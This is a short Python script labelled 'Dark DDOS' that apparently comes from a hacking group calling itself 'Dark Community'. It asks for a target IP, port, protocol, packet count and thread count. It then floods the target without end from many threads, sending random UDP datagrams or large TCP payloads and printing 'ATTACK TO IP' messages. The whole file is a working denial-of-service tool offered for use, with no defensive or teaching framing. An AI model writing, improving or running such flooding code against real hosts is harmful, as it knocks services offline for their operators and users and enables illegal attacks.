import random
import socket
import os,sys
import threading
import time 

print("""\033[95m
  ____             _                           
 |  _ \  __ _ _ __| | __                       
 | | | |/ _` | '__| |/ /____                   
 | |_| | (_| | |  |   <_____|                  
 |____/ \__,_|_|  |_|\_\           _ _         
  / ___|___  _ __ ___  _   _ _ __ (_) |_ _   _ 
 | |   / _ \| '_ ` _ \| | | | '_ \| | __| | | |
 | |__| (_) | | | | | | |_| | | | | | |_| |_| |
  \____\___/|_| |_| |_|\__,_|_| |_|_|\__|\__, |
                                         |___/ """)
ip = str(input("\033[92mDark DDOS | \033[93mHOST/IP ====> : \033[91m"))
port = int(input("\033[92mDark DDOS | \033[93mPORT ====> : \033[91m"))
choice = str(input("\033[92mDark DDOS | \033[93mMethod ====> : \033[91m"))
times = int(input("\033[92mDark DDOS | \033[93mPAKET ====> : \033[91m"))
threads = int(input("\033[92mDark DDOS | \033[93mTHREAD ====> : \033[91m"))
os.system("clear")
def run():
    data = random._urandom(885)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print("\033[91mATTACK TO IP \033[36m%s \033[91mAND PORT \033[36m%s"%(ip,port))
        except:
            print("\033[91mRECONECT")

def run2():
    data = random._urandom(102040)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print("\033[91mATTACK TO IP \033[36m%s \033[91mAND PORT \033[36m%s"%(ip,port))
        except:
            s.close()
            print("\033[91mRECONECT")

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = run)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = run2)
        th.start()